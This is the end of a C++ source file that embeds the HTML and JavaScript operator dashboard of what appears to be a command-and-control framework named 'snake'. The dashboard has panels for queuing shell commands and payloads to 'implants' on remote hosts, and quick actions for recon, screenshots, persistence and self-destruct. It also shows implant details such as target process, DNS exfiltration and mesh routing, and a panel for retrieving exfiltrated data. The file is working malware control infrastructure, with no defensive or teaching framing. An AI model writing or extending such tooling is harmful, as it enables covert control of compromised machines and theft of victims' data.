    '<div style="flex:2;min-width:180px"><label style="display:block;color:#555;font-size:9px;letter-spacing:1px;margin-bottom:3px">PAYLOAD (JSON)</label><input type="text" id="custom-task-payload" value=\'{"command":"whoami"}\' style="background:#111;border:1px solid #1a3a1a;color:#c0c0c0;padding:6px 8px;font-family:Courier New,monospace;font-size:11px;width:100%;outline:none"></div>' +
    '<div><button class="btn" onclick="sendCustomTask(\'' + id + '\')" style="margin-top:12px">queue task</button></div>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +

    '<div class="detail-panel" id="panel-payload">' +
    '<div class="card">' +
    '<div class="card-header"><h3>Execute Payload</h3></div>' +
    '<div class="card-body">' +
    '<div class="payload-form">' +
    '<select id="payload-select">' +
    '<option value="">-- select payload --</option>' +
    (payloadsCache.map(function(p) {
      return '<option value="' + escHtml(p.name || p.file) + '">' + escHtml(p.name || p.file) + (p.category ? ' [' + p.category + ']' : '') + '</option>';
    }).join('')) +
    '</select>' +
    '<input type="text" id="payload-args" placeholder=\'{"args":"val"}\'>' +
    '<button class="btn" onclick="runPayload(\'' + id + '\', document.getElementById(\'payload-select\').value, document.getElementById(\'payload-args\').value)">execute</button>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '<div class="card">' +
    '<div class="card-header"><h3>Available Payloads</h3></div>' +
    '<div class="card-body">' +
    (payloadsCache.length === 0 ? '<p style="color:#444;font-size:11px">no payloads available</p>' :
    '<div class="table-wrap"><table><tr><th>Name</th><th>Category</th><th>Description</th><th>Platform</th><th>File</th></tr>' +
    payloadsCache.map(function(p) {
      return '<tr><td>' + escHtml(p.name) + '</td><td>' + escHtml(p.category||'-') + '</td><td>' + escHtml(p.desc||'-') + '</td><td>' + escHtml(p.platform||'all') + '</td><td>' + escHtml(p.file||'-') + '</td></tr>';
    }).join('') +
    '</table></div>') +
    '</div>' +
    '</div>' +
    '</div>' +

    '<div class="detail-panel" id="panel-actions">' +
    '<div class="card">' +
    '<div class="card-header"><h3>Quick Actions</h3></div>' +
    '<div class="card-body">' +
    '<div class="btn-group">' +
    '<button class="btn" onclick="quickAction(\'' + id + '\',\'recon\')">recon</button>' +
    '<button class="btn" onclick="quickAction(\'' + id + '\',\'sleep30\')">sleep 30s</button>' +
    '<button class="btn" onclick="quickAction(\'' + id + '\',\'screenshot\')">screenshot</button>' +
    '<button class="btn" onclick="quickAction(\'' + id + '\',\'persist\')">persist</button>' +
    '<button class="btn btn-danger" onclick="if(confirm(\'send self-destruct to this implant?\'))quickAction(\'' + id + '\',\'selfdestruct\')">self-destruct</button>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '<div class="card">' +
    '<div class="card-header"><h3>Information</h3></div>' +
    '<div class="card-body">' +
    '<div class="kv-list">' +
    '<div class="kv-key">ID</div><div class="kv-val green">' + escHtml(im.id) + '</div>' +
    '<div class="kv-key">Type</div><div class="kv-val">' + escHtml(im.type || '-') + '</div>' +
    '<div class="kv-key">Hostname</div><div class="kv-val">' + escHtml(im.hostname || '-') + '</div>' +
    '<div class="kv-key">Target Process</div><div class="kv-val">' + escHtml(im.target_proc || '-') + '</div>' +
    '<div class="kv-key">Architecture</div><div class="kv-val">' + escHtml(im.arch || '-') + '</div>' +
    '<div class="kv-key">DNS Exfil</div><div class="kv-val">' + (im.dns_enabled ? 'enabled' : 'disabled') + '</div>' +
    '<div class="kv-key">Mesh Routing</div><div class="kv-val">' + (im.mesh_enabled ? 'enabled' : 'disabled') + '</div>' +
    '<div class="kv-key">Flagged</div><div class="kv-val">' + (im.flagged ? 'yes' : 'no') + '</div>' +
    '<div class="kv-key">Node ID</div><div class="kv-val">' + escHtml(im.node_id || '-') + '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '<div class="card">' +
    '<div class="card-header"><h3>Exfil Data</h3><div><button class="btn btn-sm" onclick="showExfilModal(\'' + id + '\')">view exfil</button></div></div>' +
    '<div class="card-body">' +
    '<p style="color:#444;font-size:11px">retrieve exfiltrated data from this implant.</p>' +
    '</div>' +
    '</div>' +
    '</div>';

  if (!shellHistory[id]) {
    shellHistory[id] = [];
  }
}

function switchDetailTab(el, name) {
  var tabs = document.querySelectorAll('.detail-tab');
  var panels = document.querySelectorAll('.detail-panel');
  for (var i = 0; i < tabs.length; i++) { tabs[i].classList.remove('active'); }
  for (var i = 0; i < panels.length; i++) { panels[i].classList.remove('active'); }
  el.classList.add('active');
  var panel = document.getElementById('panel-' + name);
  if (panel) panel.classList.add('active');
  if (name === 'shell') {
    var inp = document.getElementById('shell-input');
    if (inp) inp.focus();
  }
}

function refreshTaskList(implantId) {
  var container = document.getElementById('tasks-container');
  if (!container) return;
  container.innerHTML = '<div class="loading">fetching...</div>';

  api('/api/dashboard/tasks/' + implantId).then(function(data) {
    var tasks = data.tasks || [];
    var html = '';
    if (tasks.length === 0) {
      html = '<p style="color:#444;font-size:11px">no pending tasks</p>';
    } else {
      html = '<div class="task-log">';
      for (var i = 0; i < tasks.length; i++) {
        var t = tasks[i];
        html = html + '<div class="task-entry">' +
          '<span class="task-time">' + (t.ts ? fmtTimeShort(new Date(t.ts*1000)) : '-') + '</span>' +
          '<span class="task-type">' + escHtml(t.type) + '</span>' +
          '<span class="task-id">#' + escHtml(t.id.substring(0,12)) + '</span>' +
          '<span class="task-status status-pending">PENDING</span>' +
          '</div>';
      }
      html = html + '</div>';
    }
    container.innerHTML = html;
  }).catch(function() {
    container.innerHTML = '<p style="color:#ff4444;font-size:11px">failed to fetch tasks</p>';
  });
}

function renderPeers() {
  if (peersCache.length === 0) {
    return '<div class="card"><div class="card-body"><p style="color:#444;font-size:11px;text-align:center;padding:20px">no mesh peers connected</p></div></div>';
  }

  var rows = '';
  for (var i = 0; i < peersCache.length; i++) {
    var p = peersCache[i];
    rows = rows + '<tr>' +
      '<td>' + escHtml((p.id||'').substring(0,12)) + '</td>' +
      '<td>' + escHtml(p.addr || '-') + '</td>' +
      '<td>' + (p.implants || 0) + '</td>' +
      '<td>' + ago(p.last_seen) + '</td>' +
      '<td>' + escHtml(p.version || '?') + '</td>' +
      '</tr>';
  }

  var tableHTML = '<div class="table-wrap"><table>' +
    '<tr><th>ID</th><th>Address</th><th>Implants</th><th>Last Seen</th><th>Version</th></tr>' +
    rows +
    '</table></div>';

  var statCards = '<div class="stats-grid">' +
    '<div class="stat-card"><div class="stat-label">Total Peers</div><div class="stat-value">' + peersCache.length + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Total Implants (mesh)</div><div class="stat-value">' + peersCache.reduce(function(s,p){return s+(p.implants||0);},0) + '</div></div>' +
    '</div>';

  return statCards + tableHTML;
}

function renderPayloads() {
  if (payloadsCache.length === 0) {
    return '<div class="card"><div class="card-body"><p style="color:#444;font-size:11px;text-align:center;padding:20px">no payloads available</p></div></div>';
  }

  var rows = '';
  for (var i = 0; i < payloadsCache.length; i++) {
    var p = payloadsCache[i];
    rows = rows + '<tr>' +
      '<td>' + escHtml(p.name) + '</td>' +
      '<td>' + escHtml(p.category||'-') + '</td>' +
      '<td>' + escHtml(p.desc||'-') + '</td>' +
      '<td>' + escHtml(p.platform||'all') + '</td>' +
      '<td>' + escHtml(p.file||'-') + '</td>' +
      '</tr>';
  }

  return '<div class="table-wrap"><table>' +
    '<tr><th>Name</th><th>Category</th><th>Description</th><th>Platform</th><th>File</th></tr>' +
    rows +
    '</table></div>';
}

window.switchDetailTab = switchDetailTab;
window.refreshTaskList = refreshTaskList;
window.showExfilModal = showExfilModal;
window.sendShellCommand = sendShellCommand;
window.sendCustomTask = sendCustomTask;
window.runPayload = runPayload;
window.quickAction = quickAction;
window.navigate = navigate;
window.showImplantDetail = showImplantDetail;
window.backToImplants = backToImplants;
window.login = login;
window.logout = logout;
window.render = render;

setInterval(updateClock, 1000);
render();
})();
</script>
</body>
</html>)SNAKEDASH";

const std::string& embedded_dashboard_html() {
    static const std::string html(kDashboardHTML);
    return html;
}

}  // namespace snake::api
